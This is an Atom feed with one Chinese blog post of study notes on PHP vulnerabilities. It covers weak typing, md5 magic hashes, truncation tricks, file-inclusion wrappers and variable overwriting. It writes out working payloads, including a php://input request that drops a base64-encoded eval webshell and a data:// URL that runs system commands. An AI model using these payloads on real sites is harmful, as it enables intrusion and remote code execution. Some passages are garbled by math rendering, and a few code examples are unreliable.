<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zpdad26.github.io/</id>
    <title>z3p.l0ve</title>
    <updated>2020-12-01T05:49:27.568Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zpdad26.github.io/"/>
    <link rel="self" href="https://zpdad26.github.io/atom.xml"/>
    <subtitle>NO PATCH FOR STUPID!</subtitle>
    <logo>https://zpdad26.github.io/images/avatar.png</logo>
    <icon>https://zpdad26.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, z3p.l0ve</rights>
    <entry>
        <title type="html"><![CDATA[一.PHP漏洞]]></title>
        <id>https://zpdad26.github.io/post/yi-php-lou-dong/</id>
        <link href="https://zpdad26.github.io/post/yi-php-lou-dong/">
        </link>
        <updated>2020-11-27T04:51:21.000Z</updated>
        <summary type="html"><![CDATA[<p>在学习完php基础知识后，将一些常见的php漏洞分析写在下面：</p>
]]></summary>
        <content type="html"><![CDATA[<p>在学习完php基础知识后，将一些常见的php漏洞分析写在下面：</p>
<!-- more -->
<h2 id="一php语言特性">一.PHP语言特性：</h2>
<h3 id="111比较操作符导致的漏洞弱类型">1.1.1比较操作符“==”导致的漏洞（弱类型）</h3>
<pre><code>$a==$b
$a===$b

$a==$b//等于TURE,类型转换后$a=$b
$a===$b//全等TURE,如果$a=$b,那么他们的类型也相同
</code></pre>
<!-- more -->
<p>如上图为php手册上的例子，可知道“==”的比较会先进行类型转换，再进行比较。</p>
<pre><code>&lt;?php
'a'==0 // true '12a'==12 //true '1'==1 //true '1aaaa55sss66'==1 //true 
</code></pre>
<h3 id="112md5sha1漏洞">1.1.2md5&amp;sha1（）漏洞</h3>
<p>首先了解到xex代表科学输入法，1e123456=1*10的123456次方。这里要说的是在遇到了0exxx这种字符串时，会将这种字符串解析为科学计数法，即上图两个式子就相等了</p>
<pre><code>&quot;0x1e240&quot;==&quot;123456&quot; //true
&quot;0x1e240&quot;==123456 //true
&quot;0x1e240&quot;==&quot;1e240&quot;//false
</code></pre>
<p>这段话的意思就是在比较时，会先将字符串解析成十进制的再进行比较，图中0x1e240解析成十进制为123456</p>
<pre><code>QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
</code></pre>
<p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。如下：</p>
<pre><code>var_dump(@md5([]) == @md5([])) //bool(true) var_dump(@md5([]) === @md5([])) //bool(true)，@表示忽略警告 var_dump(null === null); //bool(true)
</code></pre>
<!-- more -->
<p>sha1原理与md5()基本相同</p>
<h3 id="12反序列化漏洞">1.2反序列化漏洞</h3>
<h4 id="121-概念分析">1.2.1 概念分析：</h4>
<p>序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p>
<!-- more -->
<p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p>
<!-- more -->PHP通过string serialize ( mixed $value )和mixed unserialize ( string $str )两个函数实现序列化和反序列化。这两种函数通过将任意类型的数据转换成string类型或者从string类型还原成任意类型
<!-- more --> php类可能会包含一些特殊的函数叫magic方法，magic方法命名是以符号__开头的，比如__construct()、__destruct()、__toString()、__sleep()、__wakeup()等等，这些函数在某些情况下会自动调用。一些magic函数及其用途如下：
<pre><code>__construct()当一个对象创建时被调用

__destruct()当一个对象销毁时被调用

__toString()当一个对象被当作一个字符串使用

__sleep() 在对象在被序列化之前运行

__wakeup将在序列化之后立即被调用所写的内容需要有对象中的成员变量的值
</code></pre>
<p>###1.3截断<br>
####1.3.1NULL(%00)截断原理：PHP内核由C语言实现，因此使用了C语言中的一些字符串处理函数，在遇到NULL字符时，处理函数就会将它当作结束标记。</p>
<h4 id="132利用方式">1.3.2利用方式：</h4>
<pre><code>在url中加入%00，如http://xxxx/shell.php%00.jpg
在burpsuite的16进制编辑工具将”shell.php .jpg”（带空格的）中间的空格由20改成00
</code></pre>
<!-- more -->url中的%00（形如%xx）,web server会把它当作十六进制处理，然后将该十六进制数据hex（00）“翻译”成统一的ascii码值“NUL（null）”，实现了截断。
<p>在2中，burpsuite用burp自带的十六进制编辑工具将”shell.php .jpg”(中间有空格)中的空格由20改成00，如果burp中有二进制编辑工具。</p>
<h4 id="133不正确的使用iconv函数新版本php已经得到修复">1.3.3不正确的使用iconv函数（新版本php已经得到修复）：</h4>
<p>在php中，所有的字符都是二进制的串，PHP本身并不认识任何编码，只是根据编码来显示内容。PHP中的chr() 函数从指定的 ASCII 值返回字符。ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</p>
<!-- more -->
<pre><code>&lt;?php
$file = $_GET['file'].'.tpl.html';
include(iconv(&quot;UTF-8&quot;, &quot;gb2312&quot;, $file));
?&gt;
</code></pre>
<p>在遇到file变量中包含非法字符utf-8的时候，iconv就会截断这个字符。</p>
<!-- more -->
<pre><code>&lt;?php
for($k=0;$k&lt;=255;$k++)
{
$a='shell.php'.chr($k).&quot;1.jpg&quot;;
echo 'k:'.$k.'   '.'$a:'.$a.'   '.'iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a):'.iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a).&quot;\n&quot;;
}
?&gt;
</code></pre>
<p>通过fuzz发现，其中 iconv(“UTF-8”,”gbk”,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>)</mo><mi mathvariant="normal">或</mi><mi mathvariant="normal">是</mi><mi>i</mi><mi>c</mi><mi>o</mi><mi>n</mi><mi>v</mi><mo>(</mo><mi mathvariant="normal">“</mi><mi>U</mi><mi>T</mi><mi>F</mi><mo>−</mo><mn>8</mn><mi mathvariant="normal">”</mi><mo separator="true">,</mo><mi mathvariant="normal">”</mi><mi>g</mi><mi>b</mi><mn>2313</mn><mi mathvariant="normal">”</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">a) 或是 iconv(“UTF-8”,”gb2313”,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">是</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord">“</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">8</span><span class="mord">”</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">”</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">b</span><span class="mord">2</span><span class="mord">3</span><span class="mord">1</span><span class="mord">3</span><span class="mord">”</span><span class="mpunct">,</span></span></span></span>a) 都会在chr(128)到chr(255)之间截断，使结果为shell.php<br>
<img src="https://zpdad26.github.io//post-images/1606800076252.jpg" alt="" loading="lazy"></p>
<h3 id="14伪协议漏洞">1.4伪协议漏洞</h3>
<figure data-type="image" tabindex="1"><img src="https://zpdad26.github.io//post-images/1606800199553.png" alt="" loading="lazy"></figure>
<h4 id="141phpinput将文件包含漏洞变成代码执行漏洞">1.4.1php://input将文件包含漏洞变成代码执行漏洞</h4>
<p>①目标网站存在包含漏洞</p>
<pre><code>&lt;?php @include($_GET[&quot;file&quot;])?&gt;
</code></pre>
<p>②使用php://input，将执行代码通过在POST data中提交<br>
<img src="https://zpdad26.github.io//post-images/1606800334163.png" alt="" loading="lazy"></p>
<h4 id="142-phpinput利用文件包含写入shell">1.4.2 php://input利用文件包含写入shell</h4>
<p>①目标网站存在包含漏洞</p>
<pre><code>&lt;?php @include($_GET[&quot;file&quot;])?&gt;
</code></pre>
<p>②使用php://input，将执行代码通过在POST data中提交</p>
<pre><code>#post方式提交
&lt;?php 
echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));
?&gt;
</code></pre>
<p>执行成功会在当前目录下生成一句话shell，可直接连接<br>
<img src="https://zpdad26.github.io//post-images/1606800421038.png" alt="" loading="lazy"></p>
<h4 id="143phpinput协议直接写入shell">1.4.3php://input协议直接写入shell</h4>
<p>①含有php://input的代码漏洞文件：(条件：allow_url_include = on&amp;allow_url_fopen()=on&amp; PHP &gt;= 5.2.0)</p>
<pre><code>&lt;?php 
$data = file_get_contents('php://input'); 
eval($data); 
?&gt;
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://zpdad26.github.io//post-images/1606800485125.png" alt="" loading="lazy"></figure>
<h4 id="144-phpfilter读取源代码">1.4.4 php://filter读取源代码</h4>
<p>php://filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：</p>
<pre><code>http://192.168.1.3/1.php?file=php://filter/read=convert.base64-encode/resource=1.php
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://zpdad26.github.io//post-images/1606800550406.png" alt="" loading="lazy"></figure>
<h4 id="145-file物理路径包含文件">1.4.5 file://物理路径包含文件</h4>
<p>file:// 协议在allow_url_fopen,allow_url_include都为off的情况下也可以正常使用：</p>
<pre><code>http://192.168.1.3/1.php?filename=file:///C:\\phpStudy\\WWW\\fileinclude\\2\\1.txt
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://zpdad26.github.io//post-images/1606800618230.png" alt="" loading="lazy"></figure>
<h4 id="146data利用文件包含data可进行命令执行">1.4.6data://：利用文件包含&amp;data://可进行命令执行</h4>
<pre><code>http://192.168.1.3/1.php?filename=data://text/plain,%3C?php%20system(%27whoami%27);?%3E
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://zpdad26.github.io//post-images/1606800674564.png" alt="" loading="lazy"></figure>
<h4 id="147zip绕过文件包含下的附加后缀">1.4.7zip://绕过文件包含下的附加后缀</h4>
<!-- more -->
<p>以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过%00截断进行绕过。但是%00截断在php版本5.3.4之后就失效了，而且还要考虑GPC，限制比较严重。除此之外，可以通过zip协议和phar协议来包含文件，突破附加后缀限制。</p>
<pre><code># 验证包含对象文件后缀是否为jpg，如果是才进行包含
&lt;?php
$file = $_GET['file'];
if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){
	include($file);
}
?&gt;
</code></pre>
<pre><code>#直接为包含对象添加jpg后缀，然后进行包含
&lt;?php
$file = $_GET['file'];
include($file.'.jpg');
?&gt;
</code></pre>
<p>绕过方法：<br>
①实战情况下往目标站点上传zip文件，里面压缩着一个jpg格式的php脚本。<br>
<img src="https://zpdad26.github.io//post-images/1606800758310.png" alt="" loading="lazy"><br>
②构造zip://php.zip#php.jpg，进行zip://伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可getshell。<br>
<img src="https://zpdad26.github.io//post-images/1606800784843.png" alt="" loading="lazy"></p>
<!-- more -->
<h3 id="15变量覆盖漏洞">1.5变量覆盖漏洞</h3>
<h4 id="151-变量覆盖">1.5.1 $$变量覆盖</h4>
<p>变量即可变变量，将一个变量的值加上 $ 来作为 另一个变量的名字；</p>
<pre><code>  &lt;?php
    $x = &quot;hello&quot;;
    $$x = 666;
    echo $x;
    echo &quot;&lt;br&gt;&quot;;
    echo $$x;
    echo &quot;&lt;br&gt;&quot;;
    echo $$x === $hello;
?&gt;
</code></pre>
<p>x将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi mathvariant="normal">拿</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">拼</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">上</mi></mrow><annotation encoding="application/x-tex">x的值hello拿来拼接上</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord cjk_fallback">拿</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">拼</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">上</span></span></span></span>变成了$hello,于是x === $hello<br>
<img src="https://zpdad26.github.io//post-images/1606800903783.png" alt="" loading="lazy"></p>
<h4 id="152-extract函数">1.5.2 extract（）函数</h4>
<p>extract(array,extract_rules,prefix)<br>
extract()函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中每个元素，将在当前符号表中创建一个对应的变量</p>
<pre><code>   &lt;?php
$a = 1;    //原变量值为1
$b = array('a' =&gt; '3');
extract($b);    //经过extract()函数对$b处理后
echo $a;    //输出结果为3
?&gt; 
</code></pre>
<h4 id="153-parse_str函数">1.5.3 parse_str()函数</h4>
<p>parse_str(string,array)**<br>
string必需。 规定要解析的字符串。array可选。 规定存储变量的数组名称。该参数指示变量存储到数组中<br>
如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p>
<pre><code> &lt;?php
$a = 1;                  //原变量值为1
parse_str('a=2');   //经过parse_str()函数后注册变量$a，重新赋值
print_r($b);          //输出结果为2
?&gt;
</code></pre>
<h4 id="154-import_request_variables函数">1.5.4 import_request_variables()函数</h4>
<p>bool import_request_variables(string<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi><mi>s</mi><mo>[</mo><mo separator="true">,</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">types[,string</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mopen">[</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>prefix] )<br>
$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀</p>
<pre><code>&lt;?php
$auth='0';
import_request_variables('G');
if($auth== 1){
echo&quot;private!&quot;;
}else{
echo&quot;public!&quot;;
}
?&gt;
</code></pre>
<p>get auth=1时，网页上会输出private！<br>
import_request_variables(‘G’)指定导入GET请求中的变量，从而导致变量覆盖</p>
]]></content>
    </entry>
</feed>